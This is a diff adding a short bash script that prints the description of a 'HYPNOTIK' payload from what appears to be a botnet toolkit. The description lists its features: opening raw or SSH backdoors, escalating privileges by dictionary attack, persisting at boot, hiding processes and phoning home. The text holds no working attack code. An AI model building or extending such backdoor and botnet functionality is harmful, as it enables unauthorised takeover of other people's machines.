@@ -1,0 +1,28 @@
+#!/bin/bash
+#
+# Regards, the Alveare Solutions society.
+#
+
+cat<<EOF
+# HYPNOTIK PAYLOAD (v1.0 Infiltrator)
+
+    * [ DESCRIPTION      ]: Software used during Stage 2 of conscript
+                            recruitment. Uses intructions specific for
+                            conscript operating system, architecture and
+                            environment.
+    * [ PAYLOAD PATH     ]: payloads/hypnotik-payload.sh
+    * [ PRIME DIRECTIVES ]:
+        * Open Backdoor
+            * Protocol == raw
+                * Generated Raw Backdoor script and execute.
+            * Protocol == ssh
+                * Creates dedicated system user and starts SSH server.
+        * Escalate priviledges (via dictionary attack)
+        * Install dependencies
+        * Set INIT at boot
+        * Create dedicated system user
+        * Cloak HYpnotiK processes
+        * Lift Evil Minion anchor (triggers Minion self destruct sequence)
+        * Phone Home
+
+EOF
